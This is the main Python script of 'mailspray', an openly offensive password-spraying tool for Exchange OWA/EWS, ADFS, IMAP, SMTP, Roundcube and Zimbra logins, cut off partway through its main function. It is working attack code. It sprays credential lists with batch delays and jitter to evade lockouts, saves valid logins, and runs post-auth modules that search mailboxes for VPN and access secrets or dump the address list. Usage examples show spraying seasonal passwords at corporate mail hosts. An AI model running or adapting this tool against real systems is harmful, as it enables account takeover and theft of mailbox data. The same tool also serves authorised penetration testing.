#!/usr/bin/env python3

import sys
import os
import time
import random
import argparse
import threading
import warnings
import json
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*urllib3.*")

from mailspray import __version__

try:
    from mailspray.protocols import (
        ADFSModule,
        EWSModule,
        IMAPModule,
        OWAModule,
        RoundcubeModule,
        SMTPModule,
        ZimbraModule,
    )
    from mailspray.protocols.imap import IMAP_DISCOVERY_PORTS, discover_imap_port
    from mailspray.protocols.smtp import SMTP_DISCOVERY_PORTS, discover_smtp_port
except ImportError as e:
    print(f"\033[1;31m[!]\033[0m Missing dependency: {e}")
    print(f"\033[1;33m[*]\033[0m Run: pip install requests")
    sys.exit(1)

from mailspray.core.db import WorkspaceDB
from mailspray.core.module import ModuleContext, get_module, list_modules


def _protected_tree_root():
    """Root directory we refuse to write credential files under (dev clone or installed package)."""
    pkg_dir = os.path.dirname(os.path.abspath(__file__))
    parent = os.path.dirname(pkg_dir)
    if os.path.basename(pkg_dir) == "mailspray" and os.path.isfile(
        os.path.join(parent, "pyproject.toml")
    ):
        return parent
    return pkg_dir


REPO_ROOT = _protected_tree_root()


def _downloads_dir():
    return os.path.normpath(os.path.join(os.path.expanduser("~"), "Downloads"))


def resolve_credential_output_path(path, repo_root):
    """Resolve paths for -o / -j. Never place files inside repo_root.

    Returns (absolute_path_or_None, error_message_or_None).
    Requires an explicit path: absolute (``/tmp/out.txt``), or relative with a
    directory part (``../results/out.txt``). Bare filenames like ``out.txt`` are rejected.
    """
    if not path:
        return None, None
    raw = path.strip()
    if not raw:
        return None, (
            "Output path is empty. Pass a non-empty path after -o / --output "
            "(or -j), e.g. -o /tmp/mailspray-hits.txt"
        )
    repo_norm = os.path.normpath(os.path.abspath(repo_root))

    def under_repo(p_abs):
        p_abs = os.path.normpath(os.path.abspath(p_abs))
        try:
            return os.path.commonpath([p_abs, repo_norm]) == repo_norm
        except ValueError:
            return False

    expanded = os.path.expanduser(raw)

    if os.path.isabs(expanded):
        final = os.path.normpath(expanded)
        if under_repo(final):
            return None, (
                f"Credential output must be outside the project tree ({repo_root}). "
                f"Pick a path such as {_downloads_dir()!s}/hits.txt or /tmp/hits.txt."
            )
        return final, None

    norm_raw = expanded.replace("\\", "/")
    if "/" not in norm_raw and not norm_raw.startswith(".."):
        return None, (
            "Bare filenames are not allowed for -o / -j. Specify a full path, for example: "
            f"-o {_downloads_dir()}/mailspray-hits.txt or -o /tmp/mailspray-hits.txt"
        )

    final = os.path.normpath(os.path.join(os.getcwd(), expanded))
    if under_repo(final):
        return None, (
            "Credential output cannot be inside the project directory (resolved from cwd). "
            "Use an absolute path outside the repo or a relative path that resolves outside it."
        )
    return final, None


def ensure_parent_dir(path):
    if not path:
        return
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)


# ── Colors ──────────────────────────────────────────────────────────

class C:
    R   = "\033[1;31m"    # red
    G   = "\033[1;32m"    # green (hits)
    Y   = "\033[1;33m"    # yellow (warnings, highlights)
    B   = "\033[1;34m"    # blue (accents)
    M   = "\033[1;35m"    # magenta / purple (protocol label)
    C   = "\033[1;36m"    # cyan ([*], speed)
    W   = "\033[1;37m"    # white (labels, URL)
    D   = "\033[2m"       # dim
    X   = "\033[0m"       # reset


# ── Output helpers (NetExec style) ──────────────────────────────────

PROTOCOLS = {
    "owa":       {"name": "OWA",       "cls": OWAModule,       "port": 443},
    "ews":       {"name": "EWS",       "cls": EWSModule,       "port": 443},
    "adfs":      {"name": "ADFS",      "cls": ADFSModule,      "port": 443},
    "imap":      {"name": "IMAP",      "cls": IMAPModule,      "port": 993},
    "smtp":      {"name": "SMTP",      "cls": SMTPModule,      "port": 587},
    "roundcube": {"name": "RCUBE",     "cls": RoundcubeModule, "port": 443},
    "zimbra":    {"name": "ZIMBRA",    "cls": ZimbraModule,    "port": 443},
}

# Default username format per protocol when --user-format auto is used
# domain_prefix → CORP\user   (Exchange native, NTLM-style)
# upn           → user@domain (UPN, required by ADFS; typical for Zimbra/Roundcube)
# plain         → user        (no domain applied — SMTP/IMAP depend on server config)
PROTOCOL_USER_FORMAT = {
    "owa":       "domain_prefix",
    "ews":       "domain_prefix",
    "adfs":      "upn",
    "imap":      "plain",
    "smtp":      "plain",
    "roundcube": "upn",
    "zimbra":    "upn",
}

def proto_tag(name):
    """Protocol column: purple header style (matches classic mailspray look)."""
    return f"{C.M}{name:<7}{C.X}"

def log_success(proto, target, user, password):
    print(f"  {proto_tag(proto)} {C.W}{target:<28}{C.X} {C.G}[+] {user}:{password}{C.X}")

def fmt_fail_line(proto, target, user, password):
    return f"  {proto_tag(proto)} {C.W}{target:<28}{C.X} {C.R}[-]{C.X} {user}:{C.D}{password}{C.X}"


def log_fail(proto, target, user, password):
    print(fmt_fail_line(proto, target, user, password))

def log_error(proto, target, user, msg):
    print(f"  {proto_tag(proto)} {C.W}{target:<28}{C.X} {C.Y}[!]{C.X} {user} — {C.Y}{msg}{C.X}")

def log_skip(proto, target, user, reason):
    print(f"  {proto_tag(proto)} {C.W}{target:<28}{C.X} {C.D}[~]{C.X} {user} — {C.D}{reason}{C.X}")

def log_info(msg):
    print(f"  {C.C}[*]{C.X} {msg}")

def log_warn(msg):
    print(f"  {C.Y}[!]{C.X} {msg}")

def log_good(msg):
    print(f"  {C.G}[+]{C.X} {msg}")


def ensure_discovered_port(scanner, args, parser, emit_log=True):
    """For IMAP/SMTP without URL port or -P, pick first reachable port (ascending lists) or exit."""
    if args.protocol == "smtp":
        if scanner.port is not None:
            return
        found = discover_smtp_port(scanner.host, args.timeout)
        if found is None:
            tried = ", ".join(str(p) for p in SMTP_DISCOVERY_PORTS)
            parser.error(
                f"No reachable SMTP port on {scanner.host!r} (tried {tried}). "
                f"Use -P PORT for a custom port."
            )
        scanner.port = found
        if emit_log:
            log_info(
                f"SMTP: auto-selected port {found} "
                f"(465=SMTPS; other probed ports use STARTTLS when advertised; "
                f"order: {', '.join(map(str, SMTP_DISCOVERY_PORTS))})"
            )
    elif args.protocol == "imap":
        if scanner.port is not None:
            return
        found = discover_imap_port(scanner.host, args.timeout)
        if found is None:
            tried = ", ".join(str(p) for p in IMAP_DISCOVERY_PORTS)
            parser.error(
                f"No reachable IMAP port on {scanner.host!r} (tried {tried}). "
                f"Use -P PORT for a non-standard listener."
            )
        scanner.port = found
        if emit_log:
            log_info(
                f"IMAP: auto-selected port {found} "
                f"(993=IMAPS; 143 uses STARTTLS when advertised; "
                f"order: {', '.join(map(str, IMAP_DISCOVERY_PORTS))})"
            )


# ── Input parsing ───────────────────────────────────────────────────

def load_list(value):
    """Load from file (one per line) or treat as single value."""
    if os.path.isfile(value):
        with open(value, "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return [value]


def apply_domain(users, domain, protocol, user_format):
    """Return new list with domain formatting (same rules as spray)."""
    if not domain:
        return list(users)
    fmt = user_format if user_format != "auto" else PROTOCOL_USER_FORMAT[protocol]
    if fmt == "plain":
        log_warn(
            f"Protocol {protocol.upper()} uses plain usernames — "
            f"domain '{domain}' not applied automatically. "
            f"Use --user-format upn or domain_prefix to override."
        )
        return list(users)
    if fmt == "upn":
        return [f"{u}@{domain}" if "\\" not in u and "@" not in u else u for u in users]
    return [f"{domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]



# ── Spray engine ────────────────────────────────────────────────────

class SprayEngine:
    def __init__(self, args):
        self.args = args
        self.lock = threading.Lock()
        self.found = []
        self._found_data = []       # structured records for JSON output
        self._user_attempts = {}    # {username: attempt_count} — lockout tracking
        self._user_found = set()    # usernames with at least one valid cred
        self.total = 0
        self.done = 0
        self.skipped = 0
        self.errors = 0
        self.start_time = None
        self._interrupted = False
        self._port = None
        self._host = None
        # Workspace findings store (NetExec-style). Best-effort; never aborts a run.
        self.db = WorkspaceDB(getattr(args, "workspace", "default"), warn=log_warn)

    def _batch_delay(self):
        """Delay between batches — not per-request."""
        if self.args.delay > 0:
            jitter = self.args.jitter * self.args.delay
            sleep_time = max(0, self.args.delay + random.uniform(-jitter, jitter))
            time.sleep(sleep_time)

    def _save(self, proto, target_display, user, password):
        host = target_display
        if "://" in host:
            host = host.split("://", 1)[1]
        host = host.rstrip("/")
        uri = f"{proto}://{user}:{password}@{host}"
        with self.lock:
            self.found.append(uri)
            self._found_data.append({
                "protocol": proto,
                "host": host,
                "username": user,
                "password": password,
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            })
            if self.args.output:
                with open(self.args.output, "a") as f:
                    f.write(uri + "\n")
        # Persist to workspace DB (thread-safe internally; best-effort).
        # Use scanner.host (clean, no port) so spray and -M runs store the same host.
        self.db.add_credential(proto, self._host or host, self._port, user, password)

    def _print_line(self, msg):
        """Print a line cleanly: clear progress bar, print, progress resumes on next tick."""
        self._clear_progress()
        print(msg)

    def _worker(self, scanner, user, password, proto_key, target):
        if self._interrupted:
            return

        proto_name = PROTOCOLS[proto_key]["name"]

        with self.lock:
            if self.args.stop_on_success and user in self._user_found:
                self.done += 1
                self.skipped += 1
                if self.args.verbose:
                    self._print_line(f"  {proto_tag(proto_name)} {C.W}{target:<28}{C.X} {C.D}[~]{C.X} {user} — {C.D}already found{C.X}")
                return
            if self.args.max_attempts > 0:
                if self._user_attempts.get(user, 0) >= self.args.max_attempts:
                    self.done += 1
                    self.skipped += 1
                    if self.args.verbose:
                        self._print_line(f"  {proto_tag(proto_name)} {C.W}{target:<28}{C.X} {C.D}[~]{C.X} {user} — {C.D}max attempts ({self.args.max_attempts}){C.X}")
                    return

        try:
            result = scanner.login(user, password)
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.done += 1
                self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if self.args.verbose:
                self._print_line(f"  {proto_tag(proto_name)} {C.W}{target:<28}{C.X} {C.Y}[!]{C.X} {user} — {C.Y}{str(e)[:60]}{C.X}")
            return

        le = getattr(scanner, "last_error", None)
        transport_fail = bool(
            le and not str(le).startswith("auth")
        )

        with self.lock:
            self.done += 1
            self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if transport_fail:
                self.errors += 1
            if result:
                self._user_found.add(user)

        if result:
            self._print_line(
                f"  {proto_tag(proto_name)} {C.W}{target:<28}{C.X} {C.G}[+] {user}:{password}{C.X}"
            )
            self._save(proto_key, target, user, password)
        elif self.args.verbose:
            if transport_fail:
                self._print_line(
                    f"  {proto_tag(proto_name)} {C.W}{target:<28}{C.X} {C.Y}[!]{C.X} {user} — {C.Y}{le}{C.X}"
                )
            else:
                self._print_line(fmt_fail_line(proto_name, target, user, password))

    # ── Progress ──

    def _progress_thread(self):
        while not self._stop_progress.is_set():
            self._print_progress()
            self._stop_progress.wait(1)
        self._clear_progress()

    def _print_progress(self):
        with self.lock:
            done = self.done
            found = len(self.found)
            errors = self.errors
            skipped = self.skipped

        elapsed = time.time() - self.start_time
        pct = (done / self.total * 100) if self.total else 0
        actual = done - skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 1 else "-"
        eta_str = ""
        if done > 0 and done < self.total:
            eta_sec = (elapsed / done) * (self.total - done)
            eta_str = f" ETA {_fmt_duration(eta_sec)}"

        line = (f"  {C.B}[{pct:5.1f}%]{C.X} "
                f"{C.W}{done}/{self.total}{C.X}  "
                f"{C.G}{found} found{C.X}  "
                f"{C.Y}{errors} err{C.X}  "
                f"{C.C}{rps} req/s{C.X}"
                f"{eta_str}")
        sys.stderr.write(f"\r{line}  \033[K")
        sys.stderr.flush()

    def _clear_progress(self):
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()

    # ── Main loop: batch-based ──
    # Fires batch of -t concurrent requests, waits --delay, next batch.
    # With -t 100 --delay 30: 100 requests every 30s = 3.3 req/s.

    def run(self, scanner, pairs, proto_key, target):
        self.total = len(pairs)
        self.start_time = time.time()
        self._port = getattr(scanner, "port", None)
        self._host = getattr(scanner, "host", None)
        batch_size = self.args.threads

        self._stop_progress = threading.Event()
        progress = None
        if not self.args.no_progress:
            progress = threading.Thread(target=self._progress_thread, daemon=True)
            progress.start()

        pool = None
        try:
            for i in range(0, len(pairs), batch_size):
                if self._interrupted:
                    break

                batch = pairs[i:i + batch_size]
                pool = ThreadPoolExecutor(max_workers=len(batch))
                futures = [
                    pool.submit(self._worker, scanner, u, p, proto_key, target)
                    for u, p in batch
                ]
                for f in as_completed(futures):
                    pass
                pool.shutdown(wait=False)
                pool = None

                if self.args.delay > 0 and (i + batch_size) < len(pairs):
                    self._batch_delay()

        except KeyboardInterrupt:
            self._interrupted = True
            if pool:
                pool.shutdown(wait=False, cancel_futures=True)
            self._clear_progress()
            log_warn("Interrupted — finishing current batch")

        self._stop_progress.set()
        if progress:
            progress.join(timeout=1)
        self._summary()
        self.db.close()

    def _summary(self):
        elapsed = time.time() - self.start_time
        actual = self.done - self.skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 0 else "-"

        print()
        print(f"  {C.B}{'─' * 58}{C.X}")

        stats = (
            f"{C.G}{len(self.found)} found{C.X}  {C.D}/{C.X}  "
            f"{C.W}{self.done} tested{C.X}  {C.D}/{C.X}  "
            f"{C.Y}{self.errors} errors{C.X}"
        )
        if self.skipped:
            stats += f"  {C.D}/{C.X}  {C.D}{self.skipped} skipped{C.X}"
        stats += (
            f"  {C.D}/{C.X}  {C.W}{_fmt_duration(elapsed)}{C.X}  {C.D}/{C.X}  "
            f"{C.C}{rps} req/s{C.X}"
        )

        print(f"  {C.M}Results:{C.X}  {stats}")

        if self.found and self.args.output:
            print(f"  {C.W}Saved:{C.X}   {self.args.output}")

        if self.args.json_output and self._found_data:
            with open(self.args.json_output, "w") as f:
                json.dump(self._found_data, f, indent=2)
            print(f"  {C.W}JSON:{C.X}    {self.args.json_output}")

        print(f"  {C.B}{'─' * 58}{C.X}")
        print()


# ── CLI ─────────────────────────────────────────────────────────────

BANNER = f"""\
{C.R}
    ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██╔████╔██║███████║██║██║     ███████╗██████╔╝██████╔╝███████║ ╚████╔╝
    ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
    ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║  ██║   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{C.X}
                                          {C.C}v{__version__}{C.X} {C.D}// mail password spraying toolkit{C.X}"""


class _StoreThreads(argparse.Action):
    """Mark that -t/--threads was passed explicitly (for --fast thread bump)."""

    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, values)
        namespace.threads_explicit = True


def run_probe(args, parser):
    """One login attempt for a single user (password not echoed in logs beyond attempt)."""
    print(BANNER)
    print()

    passwords = load_list(args.password)
    if not passwords:
        parser.error("Probe requires at least one password (-p / --password)")
    if len(passwords) > 1:
        log_warn(f"Probe: multiple passwords — using first only ({len(passwords)} in list)")

    password = passwords[0]
    users = apply_domain([args.probe_user], args.domain, args.protocol, args.user_format)
    user = users[0]

    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout
    if args.port:
        scanner.port = args.port
    if args.protocol == "adfs" and args.adfs_applies_to:
        scanner.applies_to = args.adfs_applies_to
    if args.debug:
        scanner.debug = True
        scanner.probe_mode = True

    ensure_discovered_port(scanner, args, parser, emit_log=True)

    log_info(f"PROBE {proto['name']} {scanner.base_url()} user={user!r}")

    ok = bool(scanner.login(user, password))
    le = getattr(scanner, "last_error", None)
    tag = f"{C.G}OK{C.X}" if ok else f"{C.R}FAIL{C.X}"
    print(f"  {C.W}Result:{C.X} {tag}")
    if not ok and le and not str(le).startswith("auth"):
        log_warn(f"Transport or server error (not bad password): {le}")
    print()
    sys.exit(0 if ok else 1)


def _fmt_duration(seconds):
    """Format seconds into human-readable duration."""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        m, s = divmod(int(seconds), 60)
        return f"{m}m {s}s"
    elif seconds < 86400:
        h, rem = divmod(int(seconds), 3600)
        m = rem // 60
        return f"{h}h {m}m"
    else:
        d, rem = divmod(int(seconds), 86400)
        h = rem // 3600
        return f"{d}d {h}h"


def parse_module_options(pairs):
    """Turn a list of KEY=VAL strings (-O) into a dict. Bare KEY becomes KEY=true."""
    opts = {}
    for item in pairs or []:
        if "=" in item:
            k, v = item.split("=", 1)
            opts[k.strip()] = v.strip()
        else:
            opts[item.strip()] = "true"
    return opts


def print_modules():
    """List discovered post-auth modules (for -L / --list-modules)."""
    print(BANNER)
    print()
    mods = list_modules()
    if not mods:
        log_warn("No modules found")
        return
    log_info(f"Available modules ({len(mods)}):")
    print()
    for name, cls in mods.items():
        protos = ", ".join(cls.supported_protocols) or "-"
        print(f"  {C.G}{name:<12}{C.X} {C.D}[{protos}]{C.X}")
        print(f"    {C.W}{cls.description}{C.X}")
        for k, h in (cls.opts_help or {}).items():
            print(f"      {C.C}-O {k}{C.X}  {C.D}{h}{C.X}")
        print()


def run_module(args, parser):
    """Authenticate with the given creds and run a post-auth module (-M)."""
    print(BANNER)
    print()

    module = get_module(args.module)
    if module is None:
        avail = ", ".join(list_modules().keys()) or "(none)"
        parser.error(f"Unknown module {args.module!r}. Available: {avail}")
    if args.protocol not in module.supported_protocols:
        parser.error(
            f"Module {args.module!r} supports {module.supported_protocols}, "
            f"not {args.protocol!r}"
        )

    parsed_opts = parse_module_options(args.module_options)
    module.options(parsed_opts)

    raw_user = args.user or args.probe_user
    users = apply_domain(load_list(raw_user), args.domain, args.protocol, args.user_format)
    passwords = load_list(args.password)
    if not users or not passwords:
        parser.error("Module run requires at least one user and password")

    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout
    if args.port:
        scanner.port = args.port
    if args.protocol == "adfs" and args.adfs_applies_to:
        scanner.applies_to = args.adfs_applies_to
    ensure_discovered_port(scanner, args, parser, emit_log=True)

    log_info(f"MODULE {C.Y}{args.module}{C.X} on {proto['name']} {scanner.base_url()}")
    db = WorkspaceDB(args.workspace, warn=log_warn)

    ran = 0
    try:
        for password in passwords:
            for user in users:
                try:
                    handle = scanner.authenticate(user, password)
                except NotImplementedError as e:
                    parser.error(str(e))
                    return
                except Exception as e:
                    log_error(proto["name"], scanner.base_url(), user,
                              f"auth error: {str(e)[:60]}")
                    continue

                if handle is None:
                    le = getattr(scanner, "last_error", None)
                    if le and not str(le).startswith("auth"):
                        log_warn(f"{user}: transport/server error: {le}")
                    elif args.verbose:
                        log_fail(proto["name"], scanner.base_url(), user, password)
                    continue

                log_success(proto["name"], scanner.base_url(), user, password)
                db.add_credential(args.protocol, scanner.host, scanner.port, user, password)

                ctx = ModuleContext(
                    protocol=args.protocol, host=scanner.host, username=user,
                    options=parsed_opts, db=db, module_name=args.module,
                    base_url=scanner.base_url(), timeout=args.timeout,
                    log_info=log_info, log_good=log_good, log_warn=log_warn,
                )
                try:
                    module.on_auth(ctx, handle)
                except Exception as e:
                    log_warn(f"module {args.module} error: {str(e)[:120]}")
                finally:
                    try:
                        scanner.disconnect(handle)
                    except Exception:
                        pass
                ran += 1
    finally:
        db.close()

    print()
    log_info(f"Module run complete — {ran} successful auth(s)")
    sys.exit(0 if ran > 0 else 1)


def build_parser():
    parser = argparse.ArgumentParser(
        prog="mailspray",
        description=BANNER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )
    parser.set_defaults(threads_explicit=False)

    target = parser.add_argument_group(f"{C.W}TARGET{C.X}")
    # Optional at the parser level so `-L`/`--list-modules` works with no target;
    # main() enforces their presence for every non-listing invocation.
    target.add_argument("protocol", choices=list(PROTOCOLS.keys()),
                        metavar="PROTOCOL", nargs="?", default=None,
                        help=f"Protocol: {', '.join(PROTOCOLS.keys())}")
    target.add_argument("target", metavar="TARGET", nargs="?", default=None,
                        help="Host, IP, or URL. Mail: smtps://host:port, imaps://host:port for TLS wrapper on non-standard ports")
    target.add_argument("-P", "--port", type=int, metavar="PORT",
                        help="Port override; omit for IMAP (143,993) or SMTP (25,465,587,2525,3025) probe")

    auth = parser.add_argument_group(f"{C.W}CREDENTIALS{C.X}")
    # Not required at parser level (so -L works); main() enforces for real runs.
    # The group stays mutually exclusive: -u and -k cannot be combined.
    creds = auth.add_mutually_exclusive_group()
    creds.add_argument("-u", "--user", metavar="USER",
                       help="Username or file with usernames (spray mode)")
    creds.add_argument("-k", "--probe", dest="probe_user", metavar="USER",
                       help="Single-user probe: one login attempt, then exit")
    auth.add_argument("-p", "--password", metavar="PASS",
                      help="Password or file with passwords")
    auth.add_argument("-d", "--domain", metavar="DOMAIN",
                      help="Domain to apply to usernames (format chosen automatically per protocol)")
    auth.add_argument("-F", "--user-format", choices=["auto", "domain_prefix", "upn", "plain"],
                      default="auto", metavar="FMT",
                      help="Username format: auto, domain_prefix (CORP\\user), upn (user@domain), plain")
    auth.add_argument("-A", "--adfs-applies-to", dest="adfs_applies_to", default=None, metavar="URI",
                      help="ADFS AppliesTo address (default: urn:federation:MicrosoftOnline)")

    engine = parser.add_argument_group(f"{C.W}ENGINE{C.X}")
    engine.add_argument("-t", "--threads", type=int, default=5, metavar="N", action=_StoreThreads,
                        help="Batch size: concurrent requests per round (default: 5)")
    engine.add_argument("-f", "--fast", action="store_true",
                        help="Fast mode: 30 threads if -t not set; intended for internal targets")
    engine.add_argument("-e", "--delay", type=float, default=0.0, metavar="SEC",
                        help="Delay between batches in seconds (not per-request)")
    engine.add_argument("-B", "--delay-scope", choices=["batch", "request"], default="batch",
                        metavar="SCOPE",
                        help="Delay applies to batch only; request scope is not implemented")
    engine.add_argument("-J", "--jitter", type=float, default=0.0, metavar="0-1",
                        help="Jitter factor for delay (0.0-1.0)")
    engine.add_argument("-T", "--timeout", type=int, default=10, metavar="SEC",
                        help="Connection timeout (default: 10)")
    engine.add_argument("-n", "--max-attempts", type=int, default=0, metavar="N",
                        help="Max login attempts per user before skipping (0 = unlimited)")
    engine.add_argument("-S", "--stop-on-success", action="store_true",
                        help="Skip remaining passwords for a user after first success")
    engine.add_argument("-D", "--debug", action="store_true",
                        help="Enable verbose protocol debug where supported")

    output = parser.add_argument_group(f"{C.W}OUTPUT{C.X}")
    output.add_argument("-o", "--output", default=None, metavar="PATH",
                        help="Append valid creds to PATH (absolute or relative with dirs; bare names rejected; never inside project)")
    output.add_argument("-j", "--json", dest="json_output", metavar="PATH",
                        help="JSON of found creds (same path rules as -o)")
    output.add_argument("-v", "--verbose", action="store_true",
                        help="Show failed attempts, skips, and errors")
    output.add_argument("-q", "--no-progress", action="store_true",
                        help="Do not show the live progress line on stderr")
    # Accepted for backward compatibility; colors are always on (flag ignored).
    output.add_argument("-N", "--no-color", action="store_true", help=argparse.SUPPRESS)

    modules_grp = parser.add_argument_group(f"{C.W}MODULES{C.X}")
    modules_grp.add_argument("-M", "--module", metavar="NAME",
                        help="Run a post-auth module after successful login (e.g. cred_scan, gal)")
    modules_grp.add_argument("-L", "--list-modules", action="store_true",
                        help="List available modules and exit")
    modules_grp.add_argument("-O", "--module-options", action="append", metavar="KEY=VAL",
                        dest="module_options", default=[],
                        help="Module option, repeatable (e.g. -O folders=INBOX,Sent -O max=200)")
    modules_grp.add_argument("-w", "--workspace", default="default", metavar="NAME",
                        help="Findings workspace DB (~/.mailspray/workspaces/NAME.db; default: default)")

    misc = parser.add_argument_group(f"{C.W}MISC{C.X}")
    misc.add_argument("-h", "--help", action="help",
                      help="Show this help message")
    misc.add_argument("-V", "--version", action="version",
                      version=f"mailspray v{__version__}",
                      help="Show version")

    parser.epilog = f"""{C.W}USAGE EXAMPLES:{C.X}
  {C.D}# Probe one user (EWS example){C.X}
  mailspray ews https://mail.corp.local -k auditor1 -p 'Secret!' -d CORP -F upn -T 15 -D

  {C.D}# External OWA — 5 threads, delay 30s, 3 attempts per user{C.X}
  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!' -d CORP -n 3 -S -e 30 -J 0.3

  {C.D}# OWA spray + JSON{C.X}
  mailspray owa https://owa.corp.com -u users.txt -p passes.txt -d CORP -F upn -e 0 -t 8 -S -j /tmp/mailspray-results.json

  {C.D}# ADFS — UPN auto-applied{C.X}
  mailspray adfs adfs.corp.com -u users.txt -p passes.txt -d corp.local -n 3 -S -e 30 -J 0.3

  {C.D}# EWS{C.X}
  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP -n 3 -S -e 20 -J 0.5

  {C.D}# Internal — fast (30 threads if -t omitted){C.X}
  mailspray imap 192.168.1.10 -u users.txt -p 'Password1' -f
  mailspray owa 10.10.10.5 -u users.txt -p passes.txt -d CORP -f -n 3

  {C.D}# SMTP{C.X}
  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt -e 5 -J 0.4
  mailspray smtp smtp.corp.com -u users.txt -p passes.txt -d corp.local -F upn

  {C.D}# Roundcube custom port{C.X}
  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.com

  {C.D}# Zimbra + JSON{C.X}
  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' -d target.com -j /tmp/mailspray-results.json

  {C.D}# Modules (NetExec style): list, then run post-auth{C.X}
  mailspray -L
  mailspray imap mail.corp.com -u user -p 'Pass!' -M cred_scan -O folders=INBOX,Sent -O max=200
  mailspray owa https://owa.corp.com -u user -p 'Pass!' -d CORP -M gal -O out=/tmp/gal.txt

{C.W}MODULES (-M):{C.X}
  cred_scan    Search mailbox for credentials/VPN/access secrets   [imap]
  gal          Dump the Global Address List (directory)            [owa, ews]
  {C.D}Findings are stored in ~/.mailspray/workspaces/<-w name>.db (credentials + loot).{C.X}

{C.W}SUPPORTED PROTOCOLS:{C.X}
  owa          Outlook Web Access (Exchange)           [443]  auto: CORP\\user
  ews          Exchange Web Services (NTLM/Basic)      [443]  auto: CORP\\user
  adfs         AD Federation Services (WS-Trust)       [443]  auto: user@domain
  imap         IMAP / IMAPS                           [auto] 143,993  plain
  smtp         SMTP / SMTPS                           [auto] 25,465,587,…  plain
  roundcube    Roundcube Webmail                       [443]  auto: user@domain
  zimbra       Zimbra Webmail                          [443]  auto: user@domain
"""
    return parser


def main():
    if len(sys.argv) == 1:
        build_parser().print_help()
        sys.exit(0)

    parser = build_parser()
    args = parser.parse_args()

    # -L lists modules and exits (no target/creds needed). Handled AFTER a full
    # parse so a value that merely equals "-L" (e.g. -p '-L') can't hijack a run,
    # and a bundled -qL is honoured.
    if args.list_modules:
        print_modules()
        sys.exit(0)

    # Enforce the arguments that are required for every real run.
    if not args.protocol:
        parser.error("PROTOCOL is required (one of: " + ", ".join(PROTOCOLS.keys()) + ")")
    if not args.target:
        parser.error("TARGET is required (host, IP, or URL)")
    if not args.user and not args.probe_user:
        parser.error("one of the arguments -u/--user -k/--probe is required")
    if args.password is None:
        parser.error("the following argument is required: -p/--password")

    if args.module:
        run_module(args, parser)

    if args.probe_user:
        run_probe(args, parser)

    if args.delay_scope == "request":
        log_warn("--delay-scope request is not implemented; using batch delay only (-e)")

    if args.output:
        args.output, err = resolve_credential_output_path(args.output, REPO_ROOT)
        if err:
            parser.error(err)
        ensure_parent_dir(args.output)
    if args.json_output:
        args.json_output, err = resolve_credential_output_path(args.json_output, REPO_ROOT)
        if err:
            parser.error(err)
        ensure_parent_dir(args.json_output)

    # ── Build credential pairs ──
    users = load_list(args.user)
    passwords = load_list(args.password)
    if not users:
        parser.error("No usernames provided")
    if not passwords:
        parser.error("No passwords provided")

    users = apply_domain(users, args.domain, args.protocol, args.user_format)

    # password spraying order: each password against all users first
    pairs = []
    for p in passwords:
        for u in users:
            pairs.append((u, p))

    # ── Fast mode (internal/local targets) ──
    if args.fast and not args.threads_explicit:
        args.threads = 30

    # ── Init scanner ──
    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout

    if args.port:
        scanner.port = args.port

    if args.protocol == "adfs" and args.adfs_applies_to:
        scanner.applies_to = args.adfs_applies_to

    if args.debug:
        scanner.debug = True

    # ── Pre-flight ──
    print(BANNER)
    print()

    ensure_discovered_port(scanner, args, parser, emit_log=True)

    target_url = scanner.base_url()
    mode = f"{C.Y}FAST{C.X}" if args.fast else f"{C.D}normal{C.X}"

    print(f"  {proto_tag(proto['name'])} {C.W}{target_url}{C.X}")

    if args.domain:
        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
        fmt_labels = {
            "domain_prefix": f"{args.domain}\\\\user",
            "upn":           f"user@{args.domain}",
            "plain":         "plain (no domain)",
        }
        log_info(f"Format: {C.Y}{fmt_labels[fmt]}{C.X}")

    log_info(f"Users: {C.Y}{len(users)}{C.X}  |  Passwords: {C.Y}{len(passwords)}{C.X}  |  Combinations: {C.Y}{len(pairs)}{C.X}")
    log_info(f"Threads: {C.Y}{args.threads}{C.X}  |  Mode: {mode}")

    if args.delay > 0:
        log_info(f"Delay: {C.Y}{args.delay}s{C.X} (jitter: {C.Y}{args.jitter}{C.X})")
        # ETA: each batch = threads concurrent, then delay
        batches = (len(pairs) + args.threads - 1) // args.threads
        eta_sec = batches * args.delay
        log_info(f"ETA: {C.Y}~{_fmt_duration(eta_sec)}{C.X} {C.D}(estimated with delay, actual may vary){C.X}")
    else:
        log_info(f"Delay: {C.D}none{C.X}")

    if args.max_attempts > 0:
